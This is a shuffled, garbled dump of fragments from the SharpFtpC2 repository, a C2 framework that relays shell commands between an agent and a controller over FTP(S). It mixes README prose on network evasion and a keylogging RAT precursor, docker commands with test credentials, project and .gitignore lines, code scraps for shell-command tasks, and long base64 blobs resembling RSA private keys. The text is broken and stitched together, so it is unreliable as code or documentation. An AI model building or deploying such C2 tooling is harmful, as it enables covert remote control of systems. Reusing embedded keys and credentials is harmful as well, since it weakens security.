+"BlasterWar's ingenuity in his project was to provide an alternative to the conventional reverse connection, where the agent needed to establish a connection back to the controlling or hacking device."
+"By reading this document, you acknowledge that you understand the potential consequences and legal implications of using this tool and agree to use it at your own risk. The author of this document cannot be held responsible for any illegal or unethical use of ""SharpFtpC2"" or related tools."
+"By using this code, the user agrees to indemnify and hold Jean-Pierre LESUEUR and PHROZEN SAS harmless from any and all claims, liabilities, costs, and expenses arising from the use, misuse, or distribution of this code. The user also agrees not to hold Jean-Pierre LESUEUR or PHROZEN SAS responsible for any errors or omissions in the code, and to take full responsibility for ensuring that the code meets the user's needs."
+"Certain flags may necessitate modifications to the functioning of the C2 protocol. For instance, if you employ the "
+"En utilisant ce code, l'utilisateur accepte de garantir et de d"
+"Feel free to tailor the settings according to your requirements. However, I strongly advise against exposing this test FTP server to local or public networks. It would be more prudent to limit the exposure of this container solely to your host machine."
+"FtpAgent.csproj"", ""{6376A5B0-1BA8-4854-B81E-F5DC072C0FEE}"""
+"FtpC2.csproj"", ""{44D0366D-742F-4E0B-A67D-3B1044A66EA7}"""
+"FtpHelper.cs"" Link=""FtpHelper.cs"" />"
+"GB@J                                "")"
+"I will, however, continue to provide support for the project in terms of addressing potential bugs or opportunities for optimization."
+"If you have an interest in the nitty-gritty of network communication, or just want to fiddle with C"
+"Instead, BlasterWar opted to use FTP (File Transfer Protocol) as the alternative medium and constructed a comprehensive Remote Access Tool around it. The Tool included features such as Screen Capture, Keylogging, and System Management, all transmitted through the FTP tunnel. At the time, FTP was widely popular and a plethora of websites offered free FTP servers to the public. This made it an ideal alternative to reverse or direct connections, which involved port forwarding. Moreover, it provided an added layer of obfuscation for the command and control (C2) as the IP address of the hacker's machine wasn't directly exposed."
+"It's worth noting that this project can be effortlessly ported by utilizing version control systems such as git, svn, or similar protocols."
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"OyuTU84zZObcQC1VA8SGq6PStoh5S4dbgPRmEjHG8MBPPHBrr51ozid5T2k8UHOFeBn1QBXuODr0lGVgpyHy6MFtj7Dg0CAwEAAQ=="""
+"P1Q=="""
+"PlaceHolders.cs"" Link=""PlaceHolders.cs"" />"
+"Please be advised that only the source code of ""SharpFtpC2"" is provided. The author does not provide any compiled binaries, and it is the responsibility of the user to compile the code themselves."
+"Project(""{9A19103F-16F7-4668-BE54-9A1E7A4F7556}"") = ""FtpAgent"", ""FtpAgent"
+"Project(""{9A19103F-16F7-4668-BE54-9A1E7A4F7556}"") = ""FtpC2"", ""FtpC2"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""RSAKeyHelper"", ""RSAKeyHelper"
+"ProtocolBase.cs"" Link=""ProtocolBase.cs"" />"
+"RSAKeyHelper.csproj"", ""{1E474090-96A7-433C-BFE6-0F8B45DECC42}"""
+"ResponseNotification.cs"" />"
+"ResponseNotification.cs"" Link=""Responses"
+"ResponseShellCommand.cs"" />"
+"ResponseShellCommand.cs"" Link=""Responses"
+"ResponseWrapper.cs"" />"
+"ResponseWrapper.cs"" Link=""Responses"
+"SharedUtilities.cs"" Link=""SharedUtilities.cs"" />"
+"SharpFtpC2 employs a basic session management system. Although quite elementary, it serves the purpose of keeping the communications synchronized and related, which is essential for the back-and-forth between the remote systems."
+"SharpFtpC2 is a small, experimental project aimed at exploring the possibility of using FTP(S) for relaying commands and responses between two remote computers. It employs the FTP protocol as a makeshift tunnel through which the computers, both acting as clients connected to an FTP server, can communicate. A simple session management scheme is used to keep track of the exchange of requests and responses."
+"SharpFtpC2 is an experimental project created for educational exploration into utilizing FTP(S) as a communication channel between two remote computers. It's crucial to understand that the project is designed as a learning resource for individuals interested in network communication, C"
+"SharpFtpC2 was born out of the desire to contribute to the [Unprotect Project](https://unprotect.it), particularly its [Network Evasion](https://unprotect.it/category/network-evasion/) category. "
+"TaskCommand.cs"" />"
+"TaskCommand.cs"" Link=""Tasks"
+"TaskShellCommand.cs"" />"
+"TaskShellCommand.cs"" Link=""Tasks"
+"TaskWrapper.cs"" />"
+"TaskWrapper.cs"" Link=""Tasks"
+"The release of version ""3.0 Final"" signifies the culmination of this project. I will not be adding any further features"
+"This disclaimer is subject to change without notice, and the user is responsible for checking for updates. If the user does not agree to the terms of this disclaimer, they should not use this code."
+"This idea of using FTP as a ""tunnel"" has roots that run deep. In fact, it brings back fond memories from around 2005 when I was still getting my feet wet in the programming world. Back then, I crossed paths with a remarkably creative French individual who went by the moniker "
+"To begin testing this project swiftly, I recommend employing Docker with the [stilliard/pure-ftpd](https://hub.docker.com/r/stilliard/pure-ftpd/) image. This image supports a range of options, enabling you to rapidly set up your own FTP server with ease."
+"To compile this project, you require two components: [Visual Studio](https://visualstudio.microsoft.com/"
+"To ensure the integrity and confidentiality of all communications between the agents and the C2, encryption has been seamlessly incorporated into the communication protocol, employing both RSA and AES-GCM 256-bit algorithms. The primary objective of this feature is to thwart the possibility of a compromised FTP server delivering malicious commands. By employing encryption, command injection is rendered impossible without access to the agent's public key. Similarly, it is not feasible to inject fake agent responses without possession of the C2's public key."
+"To make the process of generating your own key pairs easier (one key pair for the agent and one for the C2), I have included a third-party tool called "
+"To verify that everything operates as intended, I have also integrated a feature within the same tool that allows you to test string encryption."
+"Today, utilizing FTP as a tunnel is not a novel concept, as a handful of Command and Control (C2) frameworks have embraced this protocol. However, employing FTP in this manner is fraught with risks. Notably, FTP's transmission of credentials in plain text over the network, combined with the necessity for both parties to possess these credentials, makes it susceptible to a myriad of attacks. Although FTP servers have made strides in addressing these security issues by increasingly adopting FTPS, which integrates SSL/TLS encryption, this adaptation has not been a panacea for all the inherent risks."
+"Using ""SharpFtpC2"" or any related tool on a computer that you do not own or without written and explicit permission is illegal and strictly prohibited. This tool is designed for educational purposes, such as penetration testing within a defined scope and with proper authorization, or for remote system management."
+"With a touch of ingenuity and by drawing inspiration from existing protocols, it is feasible to tackle a substantial number of the existing risks. "
+"Y G@B                             "")"
+"clamations, responsabilit"
+"docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e ""PUBLICHOST: 127.0.0.1"" -e ""ADDED_FLAGS=-E -A -X -x --tls=2"" -e FTP_USER_NAME=dark -e FTP_USER_PASS=toor -e FTP_USER_HOME=/home/dark -e ""TLS_CN=localhost"" -e ""TLS_ORG=maislaf"" -e ""TLS_C=FR"" stilliard/pure-ftpd"
+"docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e ""PUBLICHOST: 127.0.0.1"" -e ""ADDED_FLAGS=-E -A -X -x"" -e FTP_USER_NAME=dark -e FTP_USER_PASS=toor -e FTP_USER_HOME=/home/dark stilliard/pure-ftpd"
+"euDn/d2VDrKFP3cUPq2FhRkgoE="""
+"s, co"
+"sultant de l'utilisation, de l'utilisation abusive ou de la diffusion de ce code. L'utilisateur accepte "
+"sulter de l'utilisation, de l'utilisation abusive ou de la diffusion de ce code. L'utilisateur de ce code accepte "
+"sulter de l'utilisation, de l'utilisation abusive ou de la diffusion de ce code."
+"uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQ=="""
+$tf/
+(Agent console debug window with dangerous action user-confirmation)
+(Execute command to active(context) agent)
+(List of agents)
+) of type 
+- A bug fix has been implemented for the execution of shell commands. All commands should now execute without causing the entire application to hang.
+- Code Optimization: The codebase has been optimized for better performance.
+- First release.
+- Implementation of Dangerous Action Validation Delegate: A validation delegate has been implemented to prompt users for confirmation before executing potentially dangerous actions.
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+. He had conceived a project named 
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.Dispose()
+.DotSettings.user
+.FileName 
+.GetPublicKeyFingerprint()
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.Length > 0)
+.MainModule
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cab
+.cachefile
+.code-workspace
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dotCover
+.dsp
+.dsw
+.e2e
+.fake/
+.gpState
+.hhc
+.hhk
+.hhp
+.history/
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.json
+.ldf
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.msi
+.msix
+.msm
+.msp
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.sln.iml
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tlog
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbp
+.vbw
+.vs/
+.vscode/
+.vshistory/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+/ pubSignature == packedFileName.Signature
+/// 
+///     
+/// </summary>
+/// <summary>
+/// Supported operations:
+/// The FtpHelper class is a utility in C
+/// This Class allows easily to perform secure encryption using both RSA (Asymetric) and AES-GCM 256 (Symetric). 
+/// providing users with a more intuitive and manageable interface for FTP operations.
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+/ohUtg13ZiY
+0i3ILJF0YRLcOhaTmC6UKBvItq9YG/68VnFyuqb4cKf7mLN3fhF5RopLWjNGxdkwd5JqGl0dmDEnSjOcWRF46MSd2uVYtICtqVA2WN7IEpnOpbhnmYnwE1Dp/lTy4VW9oBGpnMxbfB2RISdOwFf
+1tfXpHXT/hQRp9swYzyxzMApXKvooSHCCerLRhVYPIbKJDY5Ow9hyqKtgaNkUJS3/tripsKLtGzTkpxDofDyZbF60gTVDYanZKwXR9zkJ7
+3KB/t6sFVt1RHWp
+6ZsL32Kx/j2/GVJPC4q3nwodBZDhsZalzi/CFdk4h0jiDyhTeSmU
+7            :PJ
+7   !G!                   
+7J5555PB
+7J5Y7
+7YYYJ7:775YY
+7mcv5DI5UsLbL4QEyF4
+8wnjfUFZMbmhe
+95sijAQHY0txGyNkaIFeiH
+9PASU6InwvZkjNITeoLks5pK83JeyMnj9HKo8IJU0JKNySJK
+:5BG
+:BY                
+:P@@
+</Project>
+</p>
+<br/>
+= OnDangerousActionConfirmation
+= OnProcessExit
+@@@@@
+@@@@@@@@@@@@@@@@7
+@@@@B
+@@@B:
+@@J 5@@@@@@@@@@@@@@@B
+@@P:P
+@Y   
+@Y              
+ADDED_FLAGS
+ANSu4HZtv
+ASALocalRun/
+AcRbyMF2kXdXwB9TAxSKSVYdhRGw6IMbytBBIvPk3gn2
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPackages/
+AutoTest.Net/
+B5!G@
+B9uS2etDgK7CNrWQ/OZOsXWoEnifq7CF
+BB!!
+BBJJJYJ 
+BZ1jvj8kSeN7
+Backup
+BenchmarkDotNet.Artifacts/
+BigCoLxF0N65nRopGTEM5sydIT9xAsi5Gs9revW5KmP3YDZs5giNszSgFnhocfFYd9IRV08w/mLBsCDezvq9kBOtffF0lbyCGyqz9g/lDR2QDkTjwvX2clsW/qYLQIsdmODcdcgL/okN7aVqiD3eq7ycFvsO/1objNrExXeoXYJQM8yenvhOAiyVwq2H5GRs4V0KujLjklehJU2bV1BQ3PviStJcZ2WwMhLMzLgG4jz8sY5AhiXbelzGydKiR7X6QHTeA
+BlasterWar
+BlasterX
+BundleArtifacts/
+BwezHL/uTir4fJ8F7EFYkNt0DfCoO/3oAqx5w0hFUmLWJ0iLV8/oitllhD5pJGBdiCRITh25JJohH3WtSL3i8SYCCkfg4dnQwvyVHNDkpYQckuOjY2duOUSPCnCAdz4qxL6RKAm5NtaD7VbK1/8aC6hlWE8CwCqAcCtOhI3EH07iRjaOrSYq1JyqJ0wpNBZSTvtCR4rNpul7
+C signal on the console has been registered.
+CLs9pp0hm65thVYRAmYGSkonFRFGEm7OrsDba9FYYxtCpztgYDjn9eH/
+Cette clause de non-responsabilit
+ClientBin/
+Debug
+DjeGn961dJWEhQL0xZvBIj7Cvr5Za
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EndGlobal
+EndGlobalSection
+EndProject
+FFueg
+FTjolJ9rlFMeGjtvtPpu/dPulWHu
+FakesAssemblies/
+FgZB1wbSAlAw7fh04C3KH24vvobd5a1gMLGqBbAu3EWMXhj2Io/8aAq8f1nvau068Dl7tyD6ybD7/pam3XN3O30Grqcp2093ZnQvNbfTTaeLjZ1fs3MFkwzMXxtoKXtivqyLBH96ZI8IEMKG9IDGxPaOfIePJr7AyTinZ1g3Y/IIWor9v
+FodyWeavers.xsd
+FtpAgent
+FtpC2
+G5:                
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+H9VjuewQqFgPO0eXK5B
+HideSolutionNode = FALSE
+It is important to note that this tool should not be used in a production environment. All users who choose to utilize this tool do so at their own risk. The author of this project does not assume any liability for any damages or negative consequences that may arise from the use of this tool.
+IuYUxhrnk3pak
+JhKXT18SH6EggMR4mS4t9KeCmoYm5n8seNjhKKK9KkdmZAmze5OJDHMHWONUCY10yuEPu/WA4CiMBHV1VOFCxbgSHO8ChlomDKNmO4DpELky91xILqZUtU4TlUxNCw5Pt
+JvwWI/0A0muLom47LrwnrXPfEErMVSQF0Gt3uz3rPcCqeC9rnXSkOyp2mcNvDlrhVrPVsQ2nWME9oUzO79fWOUa/ZkspS2aAXIRqPZI7QMvSOkQuzEFKwEWxOM6vMPj26S7kczDXlmEiae7mi8fK3bAt3Wn50d5wKCAQAl
+L3XFLsCOK0o7IR76tZJWruYZ7iCFGwH2oUUuYOUZCMkm4iiLBZjySMI2JpXP7NsTNIcez2nZdaBD/1v6hqdY/33ekJYe1ip
+LDfPhO9J8GqUTRXczMyqhWRiKl1G6EJtCqGm5o2H3xysTHxKw3jl4G4fBiWVxxA/182S
+LPDUbh
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+Mnuhrb13UifGoKMoaIY31vLMEeJ7Onyxnf15XiV4r2LorMHTwlqd1gyMR6dAu5nzshKA8yle06qrPpTP10pw7pR/iznKI/LAyJes/ox5JbO/Z1tmjtMDChx1
+N4Gt3U0QUp79PlAw5M6Dhl
+Na3oC4llpVQbXK1LdAzySaW1SQxscarTPez5DSkBPbnPx99jmSvF9
+NlFtT4euvH5e3Xb/7EivS4T3fdA0dMAy0iZ4Cf9je8C2GMst0pYwHQcW12LASwrmm90BBz/gFMLsBv/nrptQ1NbkFfdlDPf
+OpenCover/
+OyuTU84zZObcQC1VA8SGq6PStoh5S4dbgPRmEjHG8MBPPHBrr51ozid5T2k8UHOFeBn1QBXuODr0lGVgpyHy6MFtj7Dg0CAwEAAQKCAgBSlvLkmh/bcc2/ZGQbb1crTZlEov1E0TevON
+P   :
+P5555J
+P5:  
+PJ5YYYY
+PRQvPJk6M3st1hkM99xSq
+PXQ6zOFbRLIuQKujxr9B
+Package.StoreAssociation.xml
+PaftxDehNAowX96JVNnLgpjFjz198CggEBAM13nRI3Ad5uairU7d2v/JMcx6eydXMXyjVi4PhtKvSBkEXRv4dbtfeSRKsj0/eA9PTg2coS6lGwA9qQr7DpHnZ43M0rKOidArTP5QkgzedJXXsSfAxSmApQYTapJwYEZjLJin1lk6saHZwbHQ54ZjrOko06bpmuAYWL9i
+PrEpF7SBI8nJmE1yf6hcwy2v6qfOh9R
+PublishScripts/
+RSAKeyHelper
+Release
+Responses
+ScaffoldingReadMe.txt
+ServiceFabricBackup/
+SolutionGuid = {2CF7C00A-9DD2-454B-86E2-4EB222AF08CB}
+SolutionGuid = {4F3EA4CF-1180-4310-AC71-76EA5FF5C9CB}
+SolutionGuid = {6F18B9C0-54F8-4A5D-AEC3-A3CC950FD477}
+StyleCopReport.xml
+TMHOFKKmkIAS43HtyxOJgCV4tJYyNLtnZXxym2FN4Y0AHuWcuub/4OfwhbmSll1LrcOymNJT8a8uSh2FkxPdYr3/TG18uPEvJ9KJhrPp2qyakCN3/URltcO/tFw7ETmauRKslUCNP1fgq71wE08B2dJfwjWa04x9pem90e5bXVg4JmJtdAoFNI
+Tasks
+TestResult.xml
+The 
+TigP
+U6Lz2tYcVoHATcMoGfERJeXJaOzOTsDCWxqrjAhQeN
+UHg2ZUgI1V6DXblql/CbOkyFVd4AptlaZ3StC2rNjCj2HFNO1VMnmSAOJZkvnvCnCQ2s6
+URNSenrF9brgbRwEcxio7/N0D
+UpgradeLog
+UyrYV90i1G2PyZUi9zHKExfi3L7jqkkrE17i2t667A5nnwSWblBDcBebdEQLddQ36f7jME2iSVleU7rNZml3NGHkBMKL1wzEs8mv9bvcQ0dO6EX5Hlu7Vwt1QZSMmU8DZjVsTweOyC
+VisualStudioVersion = 17.6.33723.286
+Vq8RibQksPI0UbwL3
+Vy8YtdC9Bmt4yx
+WT.mc_id=SEC-MVP-5005282) and a dependency for the controller named [CommandLineUtils](https://www.nuget.org/packages/Microsoft.Extensions.CommandLineUtils
+WT.mc_id=SEC-MVP-5005282).
+WT_mc_id=SEC-MVP-5005282
+WYXdRTCUYM5po6YSTtb
+Xe4SpBq/OkBdoEUNcz7eAC/ssJ2DacZCiC1knTQH0spRfN1Oy89AoIBAAogoOPqoER6eALHXIDgj5gzXoaG
+Y7:75Y:!
+Y@@@@B
+YJYJY!:
+YYJYJ
+ZHYAQTdQlIUrLfr4mBcVY6ATteqLtXE7alUadn8X1h5/mIqP4CDTpJjGF/C/vVXvDY8WkISaD8ILbVi6WP0bjDOFYd2kU7y4vFU1x7i1dtPrjKcDg81nkf1JRUtsks9Pvriejyh3tk/eFVXy6xjI1h8ekJhqp
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+adKXeHvvXln7zxs3lb5C8rEpfDi6L0Xcc3kOQZHM0wHM/DFufUF4BVSpcLnRBE90Cdiw/B11iPE3AQtMnL80e
+aq60DOIDnsD1152tSws0IjMbKgeUBscegrJAJkAQfgn4Vb2kQYlSpeZJeULp3UZVos0ORFIL1aCf10f43RPJxS5pM1I1uEjJGBHgSC9RODYp
+artifacts/
+avis et l'utilisateur est responsable de v
+bGp6fMCIXPbF0Kitn522rMfp
+bhT3nD54wH1A7Dj0kZxzcx15kd4QvR5bJ1c5tb
+bld/
+bower_components/
+bwHYiK/hM6fCVd5LlGkeyoBLNUSKcMlYKL/jG3tvtNuLTc8ucLbd3XiQWUj6MGJlHTxW6RZos6OglqoiJ7eO6xyKMuwKCAQEA6p0vYFRaxbMgaxW
+c6gWIlotAoIBAAw3IFf4lhmi1peCHeMA/kWsDp9Ev
+cXNtT/GwQHlLgJ0s2N0bft3i4CoU/XnzQTweQF6A
+class Program
+coverage
+cpkmdnACd8U7XtP98NTGeFZDpdlXeRIDhyJqC9dq0jUUnqdNyNpbL
+crunch
+csx/
+d3ZBS6PVV/Wz5WHcTrmUKq94FRVVPNBN18fCX5IadjjbWc7ROr5j7i8eZ9IQe6N2xtDGZQ5K9sr7UPo6n/J2/b7Y3fB9akVt/EZTtpiFUiPiuZHDFhS
+d89FThLQT1nYIevjMmO/wNmHKMV6vd0UJ8vfypYCF
+dlldata.c
+docker pull stilliard/pure-ftpd
+eGo1cVka7/Gr3TgWOFTUnY6Ul1H1wKCAQA0lxWBqpJBagZD9B0qIDwHM67IOkgkvAtpnR54ZMGmhXeVxwZuPpbGErTPKW2eWywA7b8ZrsA
+ecf/
+exit
+fRD/jHA14lM0a0D6/2eeHDfRl22GfzUCggEAPTG1r4F/DSp82ZbcDLjSBSgFQtHi4T982fNQq2x2uDpBMYURrDSmyjuUA6XVjNiGkzlozTX0QX5NiNzp/Csy6JsQs3XDLyF
+fg6pOtWj5dJKtIxAHWbOtyA4guW7GhRtCkkMyUzao2qwT4QKCAQEA0aw/Dcyq/6lnyFh50ixDRPyixkzwkRZVvkmSQqStOvK7nqyPPDlDwXqsBlOckwcbcT9ylQmnkHaPU4ndYCCbt6twT
+gager Jean-Pierre LESUEUR et PHROZEN SAS de toutes r
+galement de lib
+galement de ne pas tenir Jean-Pierre LESUEUR ou PHROZEN SAS responsable des erreurs ou omissions dans le code et de prendre l'enti
+h59kDmUlYX1RgButpEmkklOQLOZHYEiLg1Pd5j
+h6hL
+healthchecksdb
+hmF8K/gLnaUp23OMQKCAQEA8TzKrUrF0Fkk7JXZA0wdib/a2gpjF/PalTk5iXeRUclcpFE55RZzVCL
+iKZwjoQlhtzF4FkVGoN7dlSDsTuN3jK4zQisfbDzSl9AqnWpApBqbQ/xtefVcdpANEHoB90tLjuaC9U
+iaOLCYY7J9T3TwImPuuWxP5nwcU2xfXQrdQISAC76lMMIgjZgPE1lPEYL1LfJENnaow6Y4NlxlYu10XyA4Arm2Pzi
+internal class ProtocolBase : IDisposable
+internal class SharedUtilities
+ipch/
+issue-259490424)
+issuecomment-104372622)
+kA0Ei3Q6CZoybIr9BOBbEEi59IH
+kW2jbJghR8Lg9pKq6f7GBON29iYEdBbMjXw2HD7dcZVqPkzT
+kogB3GcPEz6I7Bp
+lST3DZHlSDWuM/r6sbySN8z
+mes ou les responsabilit
+mono_crash.
+mscbGtwKbSRehgD44yHC5vBKcrw8mUfom4jha
+nCrunchTemp_
+namespace FtpAgent
+namespace FtpC2
+namespace FtpC2.Responses
+namespace FtpC2.Tasks
+namespace Shared
+ndgJ3e3JN2NAKd3TSddhDKNhBZQkRAIL27veUOIrjxMtkGzwaVrzpyE39nq5yvlOSgo0fsKXzbPKiiGv5VOo/irKVDhUjXgLzilZyKcbOVLaoEK3iPtjMQoUee3h9j3H95XZNz/zlKF3kAB7aGA88NS4fWrVwrZOR
+node_modules/
+nunit-
+oGdlBglMhPiZAlTskWHiyUYTCmrY4EgqBEbPE1VezHXjt
+oXCLGTsW2ZkeL0S3a/gWg/KPZWAVEJ9wbnQgjQ0QmFJPyiDqpYE69XcuJxT/l/wbx
+orleans.codegen.cs
+paket-files/
+penses r
+pond aux besoins de l'utilisateur.
+pragma warning disable SYSLIB0014
+pragma warning restore SYSLIB0014
+project.fragment.lock.json
+project.lock.json
+public class AsymEncryptionHelper : IDisposable
+public class FtpHelper
+public static class UX
+publish/
+r0whR5ke
+rcf/
+re responsabilit
+rer Jean-Pierre LESUEUR et PHROZEN SAS de toute responsabilit
+rifier les mises 
+s juridiques qui pourraient r
+s sur ce compte Github par Jean-Pierre LESUEUR et sa soci
+tG2JM7LkUgFcOTz/MuGt9GDxC0Zg6hqYAiYN87UqIDUvBS343ZTTd/OVgjzDL0x0frmkgNwa8znY53sG3WmtazROtDTdgtTxP/1
+td4hP/UsxUEJgpC7GLbyJQoDH1iP6UDbOKCFEyiklx5LAhJEjNTui6vobf8eS2ttAz8L9xRfDT1MEhXD
+tltdDXrusRIfniXbHcMNW1/NV0oGpfMrXb6GVcdARzUoRVIj3OQrzwwgvqITSjHMXaqBpCEUtSel4bSebrnYo6qlumOx8acI10gaFGtkzj6B1at8eGWI7Bjra/YcVeZc3CH2Ov4DoCyT1Z8UEYUgQa0uU7USgNJDEg
+ts et d
+u8TgTksAL62O0t44eEUR3rVutxJOtpi6W3ZXW4kxLJvqqbkh3dqX76Z4pVBFbqe0EM7zu
+uFpYwSpyqbHljLRWb0GFOHx1L49Cxwd6CvPeaJW0sZUtDgjkLTVlCPr5i4B7U8Ku8wRTIS5oNXQ4
+uPGAF7/p3ZzRDsayhsbuHvnwzVbY8Tp9xedDj85TorehmPJJsTYmDsOahhh57E5Lpcfze32dO83z3slVHp/fYNpfHMLakV/gn0bvJFohCpCvxyUR6zSRVvvrPA0mHUAJPviX5lnenTTg8pwBLiBcGOGvdBromUDqCHlxQgEH0CAwEAAQKCAgB5Ph7
+uQF8loNQDLH5zO9oIEpdzoonsMmntOqYQMk2
+using Aes aes = Aes.Create()
+using FtpAgent
+using FtpC2
+using FtpC2.Responses
+using FtpC2.Tasks
+using Microsoft.Extensions.CommandLineUtils
+using System
+using System.Collections.Concurrent
+using System.Collections.Generic
+using System.ComponentModel
+using System.Data
+using System.Diagnostics
+using System.Linq
+using System.Net
+using System.Security.Cryptography
+using System.Security.Cryptography.X509Certificates
+using System.Security.Principal
+using System.Text
+using System.Text.Json
+using System.Text.RegularExpressions
+using System.Threading.Tasks
+view=net-7.0
+wKCAQEA
+wKqt6jk0eoNczt00X60mBQ/YC0ff6hDDz7pNo40gGHwan1C/cszCQ/yC2lueRRTXS9xz
+wKw7xjx3hs9QUcooXL1uVibanjuj46
+wwAl8QuWf2zOTnBXSzN2jXKUDz29u3ITkhRnZJm0Vkma1Nuo6n7OB5m4lbUTQB4/cMNihUOvDSkPwh
+wwwroot/
+x64/
+x86/
+xagYyTnSCbUA4/T9Ct0DZvIQiSH1V
+xxr7hsdUCZreSWO1HgiWY30RAve309JubY3f3xHIsTjHfwAHDkJJ7sXoUTIOwtPK4vbHOsOdb6Zm82UQuJd3u9j9VXgIeIcgLCv
+yzlRdqx4MUZ2McWwrSHe4VhBavyRDShtFHFVTOUSI0o
+{   
+{    
+{1E474090-96A7-433C-BFE6-0F8B45DECC42}.Debug
+{1E474090-96A7-433C-BFE6-0F8B45DECC42}.Release
+{44D0366D-742F-4E0B-A67D-3B1044A66EA7}.Debug
+{44D0366D-742F-4E0B-A67D-3B1044A66EA7}.Release
+{6376A5B0-1BA8-4854-B81E-F5DC072C0FEE}.Debug
+{6376A5B0-1BA8-4854-B81E-F5DC072C0FEE}.Release
+{AgentSession}
+{agentId}
+{argument.Value()}
+{nature}
+{needle}]
+{response.GetType().Name}
+{responseId}
+{responseShellCommand.Command}
+{task.GetType().Name}
+{task.Id}
+{taskId}
